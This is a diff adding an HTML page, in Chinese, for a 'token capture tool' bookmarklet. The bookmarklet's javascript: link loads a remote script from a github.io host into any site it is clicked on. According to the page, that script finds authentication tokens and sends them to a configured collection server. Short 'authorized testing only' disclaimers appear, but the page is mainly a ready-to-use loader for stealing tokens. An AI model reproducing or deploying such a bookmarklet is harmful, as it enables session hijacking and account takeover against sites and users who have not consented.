@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Token捕获工具</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            line-height: 1.6;
+        }
+        .bookmarklet {
+            display: inline-block;
+            padding: 10px 15px;
+            background-color: #f0f0f0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            color: #333;
+            text-decoration: none;
+            font-weight: bold;
+            margin: 20px 0;
+        }
+        .bookmarklet:hover {
+            background-color: #e0e0e0;
+        }
+        .instructions {
+            background-color: #f8f8f8;
+            border-left: 4px solid #4285f4;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+        code {
+            background-color: #f5f5f5;
+            padding: 2px 4px;
+            border-radius: 3px;
+            font-family: monospace;
+        }
+    </style>
+</head>
+<body>
+    <h1>Token捕获工具</h1>
+    
+    <div class="instructions">
+        <p><strong>使用说明：</strong> 将下面的链接拖到您的浏览器书签栏，然后在需要测试的网站上点击此书签。</p>
+    </div>
+    
+    <p>将此链接拖到您的书签栏：</p>
+    
+    <a class="bookmarklet" href="javascript:(function(){var s=document.createElement('script');s.src='https://haoxiaochuan.github.io/tc/token_capture.js';document.body.appendChild(s);})();">Token捕获工具</a>
+    
+    <h2>使用方法</h2>
+    <ol>
+        <li>将上面的"Token捕获工具"链接拖到浏览器的书签栏</li>
+        <li>导航到授权测试的目标网站</li>
+        <li>点击书签栏中的"Token捕获工具"</li>
+        <li>脚本将自动搜索并捕获认证Token</li>
+        <li>捕获的Token将发送到配置的收集服务器</li>
+    </ol>
+    
+    <h2>注意事项</h2>
+    <ul>
+        <li>此工具仅用于授权的安全测试</li>
+        <li>请确保您有明确的许可使用此工具</li>
+        <li>不要在未授权的系统上使用</li>
+    </ul>
+    
+    <script>
+        // 检测是否可以使用书签
+        if (window.location.protocol === 'file:') {
+            alert('警告：此页面通过本地文件系统打开，书签功能可能无法正常工作。请通过Web服务器访问此页面。');
+        }
+    </script>
+</body>
+</html> 
